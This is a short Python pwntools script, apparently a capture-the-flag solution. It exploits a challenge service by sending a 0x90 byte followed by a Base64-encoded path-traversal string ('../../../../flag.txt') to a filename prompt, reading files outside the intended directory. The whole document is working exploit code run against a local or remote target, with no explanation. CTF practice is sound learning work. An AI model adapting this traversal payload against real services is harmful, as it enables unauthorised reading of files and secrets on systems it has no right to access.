from pwn import *
import sys
import re
import base64

DEBUG = 0
def create_payload(malicious_path):
    # Encode the malicious path in Base64
    b64_encoded_path = base64.b64encode(malicious_path.encode()).decode()

    # Construct the final payload, prepending the 0x90 character (as the C program checks for this)
    payload = "\x90" + b64_encoded_path
    print(f"Create payload {list(payload)}")
    return payload

# context.log_level = 'debug'

if DEBUG:
    # Invoke as  python3 ./writeup exploit.py ./src/sympaty -t 0 -w ./ro
    conn = process(sys.argv[1:])
    flag_file = "../../../../../../../../tmp/flag.txt"
else:
    conn = remote(sys.argv[1], sys.argv[2])
    flag_file = "../../../../flag.txt"

conn.recvuntil(b"Enter your choice:")
print("received request")
conn.sendline(b"2")
conn.recvuntil(b"Enter the filename:")

payload = create_payload(flag_file)

conn.sendline(payload)

result = conn.recvall(timeout=2)
print(result.decode())



